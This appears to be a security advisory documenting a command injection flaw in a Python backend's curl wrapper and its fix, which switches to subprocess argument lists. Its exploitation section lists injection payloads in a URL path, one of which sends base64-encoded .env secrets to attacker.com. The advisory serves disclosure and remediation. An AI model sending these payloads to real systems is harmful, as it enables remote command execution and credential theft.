# Security Fix: Command Injection Vulnerability in network_utils.py

## Vulnerability Summary

**Severity:** Critical (CVSS 9.8)

**CVE Eligible:** Yes

**Affected Component:** `backend/services/network_utils.py`

**Vulnerability Type:** Command Injection (CWE-77)

## Description

The `fetch_with_curl()` function in `network_utils.py` contained a command injection vulnerability that allowed attackers to execute arbitrary system commands through a vulnerable API endpoint.

## Technical Details

### Vulnerable Code (Before Fix)

```python
# Lines 74-80 in network_utils.py
header_flags = " ".join(f'-H "{k}: {v}"' for k, v in default_headers.items())
if method == "POST" and json_data:
    payload = json.dumps(json_data).replace('"', '\\"')
    curl_cmd = f'curl -s -w "\\n%{{http_code}}" {header_flags} -X POST -H "Content-Type: application/json" -d "{payload}" "{url}"'
else:
    curl_cmd = f'curl -s -w "\\n%{{http_code}}" {header_flags} "{url}"'

# Line 83
res = subprocess.run([_BASH_PATH, "-c", curl_cmd], ...)
```

### Attack Vector

In `main.py` line 163:
```python
@app.get("/api/route/{callsign}")
async def get_flight_route(callsign: str):
    r = fetch_with_curl("https://api.adsb.lol/api/0/routeset",
                        method="POST",
                        json_data={"planes": [{"callsign": callsign}]},
                        timeout=10)
```

The `callsign` parameter is user-controlled and gets passed to `fetch_with_curl()`.

### Exploitation Example

An attacker could send:
```
GET /api/route/ABC$(whoami)
GET /api/route/ABC;cat /etc/passwd
GET /api/route/ABC`curl http://attacker.com/steal?data=$(base64 ~/.env)`
```

The payload would be executed by bash when the curl command is constructed.

## Fix Applied

The fix replaces the unsafe string concatenation with proper subprocess argument list:

```python
# Safe approach using argument list
curl_args = [_CURL_PATH, "-s", "-w", "\\n%{http_code}", "-S"]

# Add headers safely as separate arguments
for k, v in default_headers.items():
    curl_args.extend(["-H", f"{k}: {v}"])

# For POST data, use stdin to prevent escaping issues
curl_args.extend(["--data-binary", "@-"])
```

When `subprocess.run()` receives a list (not a string), it executes the command directly without invoking a shell, which prevents command injection.

## Impact

Before this fix, an attacker could:
- Execute arbitrary shell commands on the server
- Read sensitive files (`.env`, API keys, source code)
- Exfiltrate data via DNS/HTTP
- Deploy malware or backdoors
- Pivot to attack internal systems

## Testing

Run the security test suite:
```bash
cd backend
python -m pytest services/test_network_utils_security.py -v
```

## Recommendations

1. Review all uses of `subprocess` in the codebase for similar issues
2. Add input validation/sanitization for all user-provided data
3. Consider adding a Web Application Firewall (WAF)
4. Implement rate limiting on API endpoints
5. Run static analysis tools (bandit, semgrep) regularly

## Credits

Discovered and fixed by security audit.
